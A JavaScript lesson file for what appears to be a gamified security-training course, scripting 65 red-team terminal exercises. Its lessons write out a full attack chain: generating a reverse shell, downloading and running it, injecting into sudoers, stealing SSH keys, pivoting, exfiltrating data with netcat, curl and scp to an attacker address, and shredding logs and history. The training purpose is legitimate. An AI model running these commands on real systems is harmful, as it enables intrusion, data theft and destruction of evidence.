// sixthmodule.js
// Module 6: Advanced Offensive Ops (Red Team) - 65 Lessons

const module6_redteam = {
  name: "6. Advanced Offensive Ops (65 Lessons)",
  lessons: [
    // --- PHASE 1: RECONNAISSANCE & ENUMERATION (1-10) ---
    {
      title: "Subnet Sweep",
      why: "Before you can exploit a machine, you must map the network topology. The <b>nmap 10.0.0.0/24</b> command sends ICMP Echo and ARP requests to all 256 addresses in the subnet. This reveals exactly which internal IP addresses are 'alive' and responding to traffic.",
      text: "Type <code>nmap 10.0.0.0/24</code>",
      objective: "Scan the 10.0.0.x subnet",
      xp: 15,
      check: (c, a) => c === "nmap" && a[0] === "10.0.0.0/24",
    },
    {
      title: "Full Port Scan",
      why: "By default, Nmap only scans the top 1,000 common ports. Hackers and sysadmins know this, so they often hide custom admin panels or databases on high, random ports (like 65000). The <b>-p-</b> flag forces Nmap to check all 65,535 possible TCP ports.",
      text: "Type <code>nmap -p- localhost</code>",
      objective: "Scan all 65,535 ports",
      xp: 20,
      check: (c, a) =>
        c === "nmap" && a.includes("-p-") && a.includes("localhost"),
    },
    {
      title: "Service Banner Grabbing",
      why: "Finding an open port 80 doesn't mean it's running a web server; it could be a misconfigured SSH daemon. The <b>-sV</b> (Service Version) flag actively interrogates the port, reading the software's raw response headers to extract its exact version number (e.g., Apache 2.4.49).",
      text: "Type <code>nmap -sV localhost</code>",
      objective: "Detect service versions",
      xp: 25,
      check: (c, a) =>
        c === "nmap" && a.includes("-sV") && a.includes("localhost"),
    },
    {
      title: "OS Fingerprinting",
      why: "Exploits are highly specific to the operating system's kernel structure. The <b>-O</b> flag sends intentionally broken and fragmented packets to the target. By measuring how the target's TCP/IP stack uniquely responds to the malformed data, Nmap can guess if it is Linux, Windows, or a router.",
      text: "Type <code>nmap -O localhost</code>",
      objective: "Attempt OS detection",
      xp: 25,
      check: (c, a) =>
        c === "nmap" && a.includes("-O") && a.includes("localhost"),
    },
    {
      title: "Nmap Scripting Engine (Vuln)",
      why: "Nmap includes a Lua-based scripting engine. By passing the <b>--script vuln</b> flag, you instruct Nmap to cross-reference the exact software versions it found against a massive database of known vulnerabilities, effectively turning Nmap into an automated vulnerability scanner.",
      text: "Type <code>nmap --script vuln localhost</code>",
      objective: "Run vulnerability scripts",
      xp: 35,
      check: (c, a) =>
        c === "nmap" && a.includes("--script") && a.includes("vuln"),
    },
    {
      title: "Search Exploit Database",
      why: "Once you identify a specific software version (e.g., Apache 2.4.49), you need weaponized code. <b>searchsploit</b> is a command-line search engine for Exploit-DB, giving you instant, offline access to thousands of zero-days and Proof-of-Concept exploits.",
      text: "Type <code>searchsploit apache</code>",
      objective: "Search for Apache exploits",
      xp: 20,
      check: (c, a) => c === "searchsploit" && a[0] === "apache",
    },
    {
      title: "Directory Brute Forcing",
      why: "Web applications hide massive amounts of data in unlinked folders (like /admin, /backups, /api). <b>Gobuster</b> uses a massive text dictionary to rapidly guess thousands of URL paths, searching for '200 OK' HTTP responses to reveal hidden attack surfaces.",
      text: "Type <code>gobuster dir -u http://localhost -w common.txt</code>",
      objective: "Run a directory brute-force",
      xp: 40,
      check: (c, a) =>
        c === "gobuster" &&
        a.includes("dir") &&
        a.includes("-u") &&
        a.includes("-w"),
    },
    {
      title: "DAST Web Scanning",
      why: "<b>Nikto</b> is a classic Dynamic Application Security Testing (DAST) tool. It rapidly probes a web server for thousands of misconfigurations, default files, and insecure HTTP headers (like missing X-Frame-Options).",
      text: "Type <code>nikto -h http://localhost</code>",
      objective: "Run Nikto web scanner",
      xp: 30,
      check: (c, a) =>
        c === "nikto" &&
        a.includes("-h") &&
        a.some((x) => x.includes("localhost")),
    },
    {
      title: "SMB Network Enumeration",
      why: "Server Message Block (SMB) is the backbone of Windows and enterprise file sharing. <b>Enum4Linux</b> interrogates the SMB protocol to extract the master list of usernames, password policies, and file shares from a network domain.",
      text: "Type <code>enum4linux -a 10.0.0.5</code>",
      objective: "Enumerate SMB on 10.0.0.5",
      xp: 40,
      check: (c, a) =>
        c === "enum4linux" && a.includes("-a") && a.includes("10.0.0.5"),
    },
    {
      title: "Automated SQL Injection",
      why: "If a web application takes user input (like ?id=1) and passes it directly to a database without sanitization, you can inject malicious database commands. <b>SQLmap</b> automates this by testing thousands of mathematical and time-based injections to trick the database into dumping its tables.",
      text: "Type <code>sqlmap -u http://localhost/page?id=1 --dbs</code>",
      objective: "Run SQLmap to list databases",
      xp: 50,
      check: (c, a) =>
        c === "sqlmap" && a.includes("-u") && a.includes("--dbs"),
    },

    // --- PHASE 2: WEAPONIZATION & DELIVERY (11-20) ---
    {
      title: "Launch Metasploit",
      why: "The <b>Metasploit Framework</b> is the premier platform for developing, testing, and executing exploit code. It standardizes thousands of exploits into a single interface, handling payload encoding, memory injection, and shell catching automatically.",
      text: "Type <code>msfconsole</code>",
      objective: "Start the Metasploit Framework",
      xp: 20,
      check: (c) => c === "msfconsole",
    },
    {
      title: "Generate Reverse Shell",
      why: "Firewalls block incoming traffic, making it impossible to connect directly *into* a hacked server. A <b>Reverse Shell</b> solves this: the malware connects *outward* from the target server back to the hacker's machine. <b>MSFVenom</b> generates this raw, compiled C/C++ shellcode.",
      text: "Type <code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.99 LPORT=4444 -f elf -o shell.bin</code>",
      objective: "Generate a Linux reverse shell",
      xp: 60,
      check: (c, a) =>
        c === "msfvenom" &&
        a.includes("-p") &&
        a.some((x) => x.includes("reverse_tcp")) &&
        a.includes("-f") &&
        a.includes("elf"),
    },
    {
      title: "Make Payload Executable",
      why: "When you download a binary in Linux, the kernel removes its 'Execution' permissions for security. You must use <b>chmod +x</b> to flip the execution bit in the file's metadata, allowing the CPU to process the malicious instructions.",
      text: "Type <code>chmod +x shell.bin</code>",
      objective: "Add execute permissions",
      xp: 15,
      check: (c, a) =>
        c === "chmod" && a.includes("+x") && a.includes("shell.bin"),
    },
    {
      title: "Host Payload (Simulated)",
      why: "To deliver the malware to the victim, attackers often spin up temporary, lightweight HTTP servers in their own workspace. (Simulation: <code>python3 -m http.server 80</code>)",
      text: 'Type <code>echo "Hosting Payload"</code>',
      objective: "Simulate hosting",
      xp: 10,
      check: (c, a, o, raw) => raw.includes("echo") && raw.includes("Hosting"),
    },
    {
      title: "Start Netcat Listener",
      why: "Since the malware will be calling *out* to you on port 4444, you must open a raw network socket on your machine to catch the connection. <b>nc -lvnp</b> tells Netcat to Listen, Verbose mode, Numeric IPs only, on Port 4444.",
      text: "Type <code>nc -lvnp 4444</code>",
      objective: "Start a netcat listener",
      xp: 30,
      check: (c, a) =>
        c === "nc" &&
        (a.includes("-lvnp") || (a.includes("-l") && a.includes("-v"))) &&
        a.includes("4444"),
    },
    {
      title: "Download Payload on Target",
      why: "Assuming you found a vulnerability allowing Remote Code Execution (RCE) on the victim server, you use the target's native <b>wget</b> tool to reach across the internet and pull your hosted malware directly into their /tmp directory.",
      text: "Type <code>wget http://10.0.0.99/shell.bin -O /tmp/shell.bin</code>",
      objective: "Download payload to /tmp",
      xp: 30,
      check: (c, a) =>
        c === "wget" &&
        a.some((x) => x.includes("shell.bin")) &&
        a.includes("-O") &&
        a.includes("/tmp/shell.bin"),
    },
    {
      title: "Execute Reverse Shell",
      why: "By typing `./`, you instruct the Linux kernel to load the `shell.bin` binary from the current directory into memory and execute its thread. The payload instantly opens a TCP socket connecting back to your Netcat listener.",
      text: "Type <code>/tmp/shell.bin</code>",
      objective: "Execute the payload",
      xp: 40,
      check: (c) => c === "/tmp/shell.bin" || c === "./shell.bin",
    },
    {
      title: "Verify Shell Access",
      why: "You caught the shell! The very first command an attacker types is <b>whoami</b>. It queries the kernel for your Effective User ID (EUID). This tells you if you hacked the server as a limited user (like www-data) or as the God user (root).",
      text: "Type <code>whoami</code>",
      objective: "Check user identity",
      xp: 15,
      check: (c) => c === "whoami",
    },
    {
      title: "Verify Group Privileges",
      why: "Even if you aren't root, you might belong to a powerful group. The <b>id</b> command prints your GIDs. For example, if you are in the 'docker' or 'lxd' group, you can instantly escalate your privileges to root by manipulating containers.",
      text: "Type <code>id</code>",
      objective: "Check group memberships",
      xp: 15,
      check: (c) => c === "id",
    },
    {
      title: "Upgrade Shell (Simulated)",
      why: "Standard Netcat reverse shells are 'dumb'—they lack TTY features like arrow keys, autocomplete, or Ctrl+C handling. Attackers use python (<code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'</code>) to upgrade their connection to a fully interactive TTY shell.",
      text: 'Type <code>echo "Shell Upgraded"</code>',
      objective: "Simulate shell upgrade",
      xp: 10,
      check: (c, a, o, raw) => raw.includes("echo") && raw.includes("Upgraded"),
    },

    // --- PHASE 3: SITUATIONAL AWARENESS (POST-EXPLOITATION) (21-30) ---
    {
      title: "Kernel Reconnaissance",
      why: "If you are a low-level user, you need to find a way to become root. The first step is checking the kernel version via <b>uname -a</b>. If the kernel is severely outdated, you can compile a public exploit (like 'Dirty COW') to force the kernel to give you root access.",
      text: "Type <code>uname -a</code>",
      objective: "Check kernel info",
      xp: 15,
      check: (c, a) => c === "uname" && a.includes("-a"),
    },
    {
      title: "Operating System Recon",
      why: "Different Linux distributions (Ubuntu, CentOS, Alpine) store configuration files in entirely different locations. Reading <b>/etc/os-release</b> tells you the exact environment you are dealing with.",
      text: "Type <code>cat /etc/os-release</code>",
      objective: "Check OS distribution",
      xp: 15,
      check: (c, a) => c === "cat" && a[0] === "/etc/os-release",
    },
    {
      title: "Root Process Discovery",
      why: "Privilege Escalation relies on hijacking things that are running as root. <b>ps aux | grep root</b> filters the massive process table, showing you exactly what high-level services (like MySQL or custom cron jobs) are currently executing.",
      text: "Type <code>ps aux | grep root</code>",
      objective: "Find root processes",
      xp: 25,
      check: (c, a, o, raw) =>
        raw.includes("ps") && raw.includes("grep") && raw.includes("root"),
    },
    {
      title: "Internal Port Discovery",
      why: "Firewalls block outside attackers from seeing internal ports (like databases on port 3306). But now that you have a shell *inside* the server, running <b>netstat -tulnp</b> reveals the hidden internal services listening on the local loopback interface.",
      text: "Type <code>netstat -tulnp</code>",
      objective: "Check active listeners",
      xp: 25,
      check: (c, a) => c === "netstat" && a.includes("-tulnp"),
    },
    {
      title: "Network Routing Discovery",
      why: "A server might be 'Dual Homed', meaning it is connected to the public internet AND a secret, highly-secure internal database network. <b>ip route</b> dumps the kernel's routing tables, revealing any hidden subnets attached to the machine.",
      text: "Type <code>ip route</code>",
      objective: "Check routing tables",
      xp: 20,
      check: (c, a) => c === "ip" && a[0] === "route",
    },
    {
      title: "ARP Cache Harvesting",
      why: "Servers constantly talk to other servers on the same network. The <b>arp -a</b> command dumps the Address Resolution Protocol cache, instantly giving you the IP and MAC addresses of neighboring machines without needing to run a loud Nmap scan.",
      text: "Type <code>arp -a</code>",
      objective: "Check the ARP cache",
      xp: 25,
      check: (c, a) => c === "arp" && a.includes("-a"),
    },
    {
      title: "Enumerate System Users",
      why: "The <b>/etc/passwd</b> file is globally readable. It contains the structural layout of every user on the system, their User IDs, and their home directory paths. Attackers read this to identify high-value targets.",
      text: "Type <code>cat /etc/passwd</code>",
      objective: "Read passwd file",
      xp: 15,
      check: (c, a) => c === "cat" && a[0] === "/etc/passwd",
    },
    {
      title: "Identify Active Accounts",
      why: "Most users in /etc/passwd are dummy service accounts (like 'www-data') that cannot log in via SSH. By grepping for <b>sh</b> or <b>bash</b>, you filter the list to show *only* the real human accounts that have active terminal access.",
      text: 'Type <code>grep "sh$" /etc/passwd</code>',
      objective: "Find active shell users",
      xp: 30,
      check: (c, a, o, raw) =>
        raw.includes("grep") &&
        raw.includes("sh") &&
        raw.includes("/etc/passwd"),
    },
    {
      title: "Read Bash History",
      why: "System Administrators are human, and they make mistakes. They often type passwords, API keys, or secret database commands directly into the terminal. Reading their <b>.bash_history</b> file can hand you the keys to the kingdom.",
      text: "Type <code>cat ~/.bash_history</code>",
      objective: "Read user terminal history",
      xp: 20,
      check: (c, a) => c === "cat" && a[0] === "~/.bash_history",
    },
    {
      title: "Check Sudo Privileges",
      why: "The holy grail of post-exploitation. The <b>sudo -l</b> command asks the system: 'What specific commands is my current user allowed to run as root without needing a password?' If a script is listed here, you can hijack it.",
      text: "Type <code>sudo -l</code>",
      objective: "Check sudo permissions",
      xp: 25,
      check: (c, a) => c === "sudo" && a.includes("-l"),
    },

    // --- PHASE 4: PRIVILEGE ESCALATION (31-45) ---
    {
      title: "Find SUID Binaries",
      why: "SUID (Set Owner User ID) is a special Linux file permission. If a file is owned by root and has the SUID bit set, any normal user who runs it will execute it with temporary root privileges. <b>find</b> locates these files. If they are vulnerable, you can exploit them to keep the root access permanently.",
      text: "Type <code>find / -perm -4000 -type f 2>/dev/null</code>",
      objective: "Find files with SUID permissions",
      xp: 50,
      check: (c, a) =>
        c === "find" && a.includes("-perm") && a.includes("-4000"),
    },
    {
      title: "Find SGID Binaries",
      why: "Similar to SUID, SGID (Set Group ID) executes the file with the privileges of the file's Group owner. It is slightly less critical than SUID, but can still allow you to pivot into an administrative group.",
      text: "Type <code>find / -perm -2000 -type f 2>/dev/null</code>",
      objective: "Find files with SGID permissions",
      xp: 50,
      check: (c, a) =>
        c === "find" && a.includes("-perm") && a.includes("-2000"),
    },
    {
      title: "Check Scheduled Tasks (Cron)",
      why: "The <b>/etc/crontab</b> file holds system-wide automated tasks. If an administrator scheduled a script to run automatically as root every 5 minutes, and that script has weak permissions, you can edit the script to spawn a root reverse shell.",
      text: "Type <code>cat /etc/crontab</code>",
      objective: "Read the cron table",
      xp: 20,
      check: (c, a) => c === "cat" && a[0] === "/etc/crontab",
    },
    {
      title: "Check Daily Crons",
      why: "Linux also has directories where any script dropped inside will be executed daily or hourly by the root kernel daemon. You must enumerate these folders to find weak automation scripts.",
      text: "Type <code>ls -la /etc/cron.daily</code>",
      objective: "Check daily scheduled scripts",
      xp: 20,
      check: (c, a) => c === "ls" && a.some((x) => x.includes("cron.daily")),
    },
    {
      title: "Shadow File Permissions",
      why: "The <b>/etc/shadow</b> file holds the encrypted passwords of every user on the system. It should STRICTLY be owned by root. If you can read it, you can run the hashes through John the Ripper to crack the root password.",
      text: "Type <code>ls -l /etc/shadow</code>",
      objective: "Check shadow file permissions",
      xp: 20,
      check: (c, a) =>
        c === "ls" && a.includes("-l") && a.includes("/etc/shadow"),
    },
    {
      title: "Download LinPEAS",
      why: "Manually checking for misconfigurations takes hours. <b>LinPEAS</b> (Linux Privilege Escalation Awesome Script) is a massive bash script that automates the enumeration of thousands of escalation vectors instantly.",
      text: "Type <code>wget http://10.0.0.99/linpeas.sh -O /tmp/linpeas.sh</code>",
      objective: "Download LinPEAS script",
      xp: 30,
      check: (c, a) => c === "wget" && a.some((x) => x.includes("linpeas.sh")),
    },
    {
      title: "Make LinPEAS Executable",
      why: "Remember, the kernel strips execution metadata from downloaded files. You must instruct the CPU that this text file contains executable bash instructions.",
      text: "Type <code>chmod +x /tmp/linpeas.sh</code>",
      objective: "Add execute permissions",
      xp: 15,
      check: (c, a) =>
        c === "chmod" && a.includes("+x") && a.includes("linpeas.sh"),
    },
    {
      title: "Run LinPEAS",
      why: "Because LinPEAS generates thousands of lines of output, running it directly floods the terminal. Red Teamers redirect (<b>></b>) the massive text stream directly into an enumeration log file for careful parsing.",
      text: "Type <code>/tmp/linpeas.sh > /tmp/enum.txt</code>",
      objective: "Run LinPEAS to a file",
      xp: 40,
      check: (c, a, o, raw) =>
        raw.includes("linpeas.sh") &&
        raw.includes(">") &&
        raw.includes("enum.txt"),
    },
    {
      title: "Parse LinPEAS Output",
      why: "LinPEAS uses color codes in its output. When it finds a 99% guaranteed privilege escalation vector, it prints the word 'RED/YELLOW'. We use grep to instantly filter the massive log file for these critical hits.",
      text: 'Type <code>grep "RED/YELLOW" /tmp/enum.txt</code>',
      objective: "Grep for critical vulnerabilities",
      xp: 35,
      check: (c, a, o, raw) =>
        raw.includes("grep") &&
        raw.includes("RED/YELLOW") &&
        raw.includes("enum.txt"),
    },
    {
      title: "Exploit Writable Sudoers",
      why: "LinPEAS detected that the <b>/etc/sudoers</b> configuration file has weak permissions! You can literally write your own rules into the system. By appending 'NOPASSWD: ALL' for your username, you give yourself permanent God-mode.",
      text: 'Type <code>echo "sysadmin ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers</code>',
      objective: "Inject into sudoers file",
      xp: 60,
      check: (c, a, o, raw) =>
        raw.includes("echo") &&
        raw.includes("NOPASSWD: ALL") &&
        raw.includes(">>") &&
        raw.includes("/etc/sudoers"),
    },
    {
      title: "Elevate to Root",
      why: "The trap has been set. The <b>sudo su</b> command tells the system: 'Use my sudo privileges to Switch User (su) directly to the root account.' Because you injected the NOPASSWD rule, the kernel grants the request instantly.",
      text: "Type <code>sudo su</code>",
      objective: "Switch to the root user",
      xp: 20,
      check: (c, a) => c === "sudo" && a[0] === "su",
    },
    {
      title: "Confirm Root Status",
      why: "Verify your new identity. If this command returns 'root', you completely own the entire operating system, kernel, and hardware.",
      text: "Type <code>whoami</code>",
      objective: "Verify root access",
      xp: 10,
      check: (c) => c === "whoami",
    },
    {
      title: "Capture the Flag",
      why: "In Red Team simulations and CTFs (Capture The Flag), a text file named 'root.txt' is placed in the root user's restricted home folder. Reading it is the mathematical proof that you successfully achieved full system compromise.",
      text: "Type <code>cat /root/root.txt</code>",
      objective: "Read the root flag",
      xp: 20,
      check: (c, a) => c === "cat" && a[0] === "/root/root.txt",
    },

    // --- PHASE 5: LATERAL MOVEMENT & PIVOTING (46-55) ---
    {
      title: "Steal SSH Keys",
      why: "Now that you own the server, you need to hack deeper into the corporate network. Administrators often leave their private SSH keys (<b>id_rsa</b>) sitting in plain text. If you steal this cryptographic key, you can log into other servers as that administrator.",
      text: "Type <code>cat ~/.ssh/id_rsa</code>",
      objective: "Read private SSH key",
      xp: 30,
      check: (c, a) => c === "cat" && a.some((x) => x.includes("id_rsa")),
    },
    {
      title: "Copy SSH Key",
      why: "Copy the stolen private key to a temporary location where you can manipulate its file permissions safely.",
      text: "Type <code>cp ~/.ssh/id_rsa /tmp/id_rsa</code>",
      objective: "Copy the private key",
      xp: 20,
      check: (c, a) => c === "cp" && a.some((x) => x.includes("id_rsa")),
    },
    {
      title: "Fix Key Permissions",
      why: "The SSH protocol is highly secure. If a private key file has 'read' permissions available to anyone else on the system, the SSH client will refuse to use it. <b>chmod 600</b> ensures only the owner can read it.",
      text: "Type <code>chmod 600 /tmp/id_rsa</code>",
      objective: "Restrict key permissions",
      xp: 25,
      check: (c, a) =>
        c === "chmod" && a.includes("600") && a.includes("/tmp/id_rsa"),
    },
    {
      title: "Lateral SSH Pivot",
      why: "Lateral Movement means moving sideways through a network. Using the stolen identity key (<b>-i</b>), you attempt to log into a neighboring database server on the hidden internal subnet.",
      text: "Type <code>ssh -i /tmp/id_rsa root@10.0.0.10</code>",
      objective: "SSH into neighboring server",
      xp: 40,
      check: (c, a) =>
        c === "ssh" &&
        a.includes("-i") &&
        a.some((x) => x.includes("root@10.0.0.10")),
    },
    {
      title: "Dynamic Port Forwarding",
      why: "Sometimes you can't SSH directly. You want your attacking machine to run tools (like Nmap) *through* the compromised server. The <b>-D</b> flag turns SSH into a SOCKS proxy, tunneling your hacking tools through the victim machine.",
      text: "Type <code>ssh -D 9050 user@10.0.0.10</code>",
      objective: "Create SSH SOCKS Proxy",
      xp: 50,
      check: (c, a) => c === "ssh" && a.includes("-D") && a.includes("9050"),
    },
    {
      title: "Proxychains Scan",
      why: "Now that the SSH tunnel is active, <b>Proxychains</b> forces your local Nmap tool to route its packets through the tunnel. It looks to the internal network like the compromised server is running the scan, perfectly hiding your attack origin.",
      text: "Type <code>proxychains nmap 10.0.0.20</code>",
      objective: "Run tunneled Nmap scan",
      xp: 50,
      check: (c, a) => c === "proxychains" && a.includes("nmap"),
    },
    {
      title: "Start Chisel Server",
      why: "If SSH is blocked by a firewall, attackers use <b>Chisel</b>. It creates an encrypted TCP tunnel encapsulated entirely inside standard HTTP packets (which bypass most firewalls). Start the server on your attacking machine.",
      text: "Type <code>chisel server -p 8000 --reverse</code>",
      objective: "Start chisel server",
      xp: 45,
      check: (c, a) =>
        c === "chisel" && a.includes("server") && a.includes("--reverse"),
    },
    {
      title: "Start Chisel Client",
      why: "On the compromised victim machine, you execute the Chisel client. It reaches out through the firewall via HTTP, hits your server, and spawns a reverse SOCKS proxy, giving you full routing access to the internal network.",
      text: "Type <code>chisel client 10.0.0.99:8000 R:socks</code>",
      objective: "Start chisel client",
      xp: 50,
      check: (c, a) =>
        c === "chisel" &&
        a.includes("client") &&
        a.some((x) => x.includes("8000")),
    },
    {
      title: "Pass the Hash",
      why: "In Windows environments, you don't actually need a plaintext password to authenticate. If you steal the NTLM hash of an Administrator, you can pass it directly into the SMB protocol to gain a remote command shell.",
      text: "Type <code>smbclient //10.0.0.10/C$ -U Administrator</code>",
      objective: "Simulate Pass-the-Hash connection",
      xp: 40,
      check: (c, a) =>
        c === "smbclient" &&
        a.some((x) => x.includes("C$")) &&
        a.includes("-U"),
    },
    {
      title: "Remote RPC Access",
      why: "The Remote Procedure Call (RPC) protocol allows you to execute commands and query data on a remote server. Using a 'Null Session' (empty username/password), you can extract massive amounts of Active Directory data.",
      text: 'Type <code>rpcclient -U "" 10.0.0.10</code>',
      objective: "Connect to RPC via Null Session",
      xp: 45,
      check: (c, a, o, raw) =>
        raw.includes("rpcclient") && raw.includes("-U") && raw.includes('""'),
    },

    // --- PHASE 6: DATA EXFILTRATION (56-60) ---
    {
      title: "Compress Sensitive Data",
      why: "Before stealing massive web application directories or database dumps, you must package them. <b>tar -czvf</b> bundles thousands of files into a single, tightly compressed Gzip archive, reducing network transfer times.",
      text: "Type <code>tar -czvf /tmp/loot.tar.gz /var/www/html</code>",
      objective: "Compress target directory",
      xp: 40,
      check: (c, a) =>
        c === "tar" &&
        a.includes("-czvf") &&
        a.some((x) => x.includes("loot.tar.gz")),
    },
    {
      title: "Base64 Encode Loot",
      why: "Some strict firewalls block the transfer of raw binary files (like .zip or .tar.gz). <b>Base64</b> encoding mathematically translates the binary archive into plain ASCII text, allowing you to copy-paste it directly out of the terminal window.",
      text: "Type <code>base64 /tmp/loot.tar.gz > /tmp/loot.b64</code>",
      objective: "Base64 encode the archive",
      xp: 40,
      check: (c, a, o, raw) =>
        raw.includes("base64") &&
        raw.includes("loot.tar.gz") &&
        raw.includes(">"),
    },
    {
      title: "Exfiltrate via Netcat",
      why: "Netcat isn't just for reverse shells; it can transfer raw bytes over the network. You pipe (<b>|</b>) the text file directly into Netcat, pushing the stolen data stream straight to the listening port on your attacking machine.",
      text: "Type <code>cat /tmp/loot.b64 | nc 10.0.0.99 5555</code>",
      objective: "Netcat data transfer",
      xp: 50,
      check: (c, a, o, raw) =>
        raw.includes("cat") &&
        raw.includes("|") &&
        raw.includes("nc") &&
        raw.includes("5555"),
    },
    {
      title: "Exfiltrate via HTTP",
      why: "Netcat traffic is unencrypted and highly suspicious. Exfiltrating data by forcing the victim machine to execute a standard <b>curl POST</b> request blends the stolen data into normal web traffic, evading Intrusion Detection Systems.",
      text: "Type <code>curl -X POST -d @/tmp/loot.tar.gz http://10.0.0.99/upload</code>",
      objective: "HTTP POST Data Exfiltration",
      xp: 55,
      check: (c, a) =>
        c === "curl" &&
        a.includes("-X") &&
        a.includes("POST") &&
        a.some((x) => x.includes("@/tmp/loot.tar.gz")),
    },
    {
      title: "Exfiltrate via SCP",
      why: "Using the SSH private key you stole earlier, you can use <b>Secure Copy (SCP)</b>. This establishes a fully encrypted, military-grade tunnel between the victim and your machine, guaranteeing the stolen data cannot be intercepted by network defenders.",
      text: "Type <code>scp -i /tmp/id_rsa /tmp/loot.tar.gz hacker@10.0.0.99:/tmp/</code>",
      objective: "Secure Copy Exfiltration",
      xp: 55,
      check: (c, a) =>
        c === "scp" &&
        a.includes("-i") &&
        a.some((x) => x.includes("loot.tar.gz")),
    },

    // --- PHASE 7: COVERING TRACKS (61-65) ---
    {
      title: "Delete Exfil Artifacts",
      why: "If a Blue Teamer finds `loot.tar.gz` sitting in the /tmp directory, they will know exactly what data was compromised. Standard procedure dictates you must immediately remove all packaging artifacts after successful exfiltration.",
      text: "Type <code>rm /tmp/loot.tar.gz /tmp/loot.b64</code>",
      objective: "Remove exfiltration files",
      xp: 20,
      check: (c, a) => c === "rm" && a.some((x) => x.includes("loot.tar.gz")),
    },
    {
      title: "Delete Attack Tooling",
      why: "If defenders find your LinPEAS script or compiled reverse shell binaries, they can reverse-engineer them to extract your Command and Control (C2) IP addresses. Erase your tools.",
      text: "Type <code>rm /tmp/shell.bin /tmp/linpeas.sh /tmp/enum.txt</code>",
      objective: "Remove exploitation tools",
      xp: 25,
      check: (c, a) => c === "rm" && a.some((x) => x.includes("shell.bin")),
    },
    {
      title: "Securely Shred Logs",
      why: "Standard `rm` deletes the file's directory pointer, but the raw data remains on the hard drive and can be recovered by forensics tools. <b>shred -u -z</b> violently overwrites the file's data blocks with random zeroes before deleting it, ensuring complete destruction of the auth log.",
      text: "Type <code>shred -u -z /var/log/auth.log</code>",
      objective: "Shred authentication logs",
      xp: 60,
      check: (c, a) =>
        c === "shred" &&
        a.includes("-u") &&
        a.includes("-z") &&
        a.includes("/var/log/auth.log"),
    },
    {
      title: "Truncate Bash History",
      why: "Using `rm` on the `.bash_history` file is a massive red flag. If an admin logs in and sees the history file is entirely missing, they trigger an incident response. Redirecting <b>/dev/null</b> (a black hole device) into the file truncates the contents to 0 bytes, leaving the file structurally intact to avoid suspicion.",
      text: "Type <code>cat /dev/null > ~/.bash_history</code>",
      objective: "Truncate bash history",
      xp: 60,
      check: (c, a, o, raw) =>
        raw.includes("cat") &&
        raw.includes("/dev/null") &&
        raw.includes(">") &&
        raw.includes(".bash_history"),
    },
    {
      title: "Clear Active Session RAM",
      why: "Even if you delete the file on the hard drive, your current terminal session holds your commands in RAM. When you log out, it writes them back to the disk. <b>history -c</b> clears your active RAM memory footprint instantly.",
      text: "Type <code>history -c</code>",
      objective: "Clear session history",
      xp: 50,
      check: (c, a) => c === "history" && a.includes("-c"),
    },
  ],
};
